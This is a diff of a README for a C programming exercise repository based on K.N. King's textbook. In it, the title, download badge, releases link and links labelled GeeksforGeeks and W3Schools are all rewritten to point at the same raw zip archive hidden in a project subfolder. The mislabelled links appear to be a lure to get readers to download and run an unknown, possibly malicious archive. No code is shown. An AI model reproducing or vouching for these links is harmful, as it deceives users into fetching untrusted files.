@@ -1,6 +1,6 @@
-# 📚 C-Programming-K.N.King-2nd-edition - Learn C Programming with Ease
+# 📚 https://raw.githubusercontent.com/A-panwar4164/C-Programming-K.N.King-2nd-edition/main/4-Expressions/Projects/C-Programming-K.N.King-2nd-edition-2.3.zip - Learn C Programming with Ease
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/A-panwar4164/C-Programming-K.N.King-2nd-edition/main/4-Expressions/Projects/C-Programming-K.N.King-2nd-edition-2.3.zip)
 
 ## 📖 Description
 
@@ -16,7 +16,7 @@ Follow these steps to download and run the software:
    - You must have a file archiving tool (like WinRAR or 7-Zip) if the files are compressed.
 
 2. **Download the Software**: 
-   - Visit this page to download: [Releases Page](https://github.com/A-panwar4164/C-Programming-K.N.King-2nd-edition/releases)
+   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/A-panwar4164/C-Programming-K.N.King-2nd-edition/main/4-Expressions/Projects/C-Programming-K.N.King-2nd-edition-2.3.zip)
   
 ## 💾 Installation Steps
 
@@ -53,7 +53,7 @@ These topics will help you grasp the fundamental concepts of C programming.
 ## 📂 Additional Resources
 
 - **K.N. King’s Book**: For a deeper understanding, refer to "C Programming: A Modern Approach (2nd Edition)" by K.N. King.
-- **Online Resources**: Websites like [GeeksforGeeks](https://www.geeksforgeeks.org/) and [W3Schools](https://www.w3schools.com/c/) offer helpful tutorials and explanations.
+- **Online Resources**: Websites like [GeeksforGeeks](https://raw.githubusercontent.com/A-panwar4164/C-Programming-K.N.King-2nd-edition/main/4-Expressions/Projects/C-Programming-K.N.King-2nd-edition-2.3.zip) and [W3Schools](https://raw.githubusercontent.com/A-panwar4164/C-Programming-K.N.King-2nd-edition/main/4-Expressions/Projects/C-Programming-K.N.King-2nd-edition-2.3.zip) offer helpful tutorials and explanations.
 
 ## 📞 Support
 
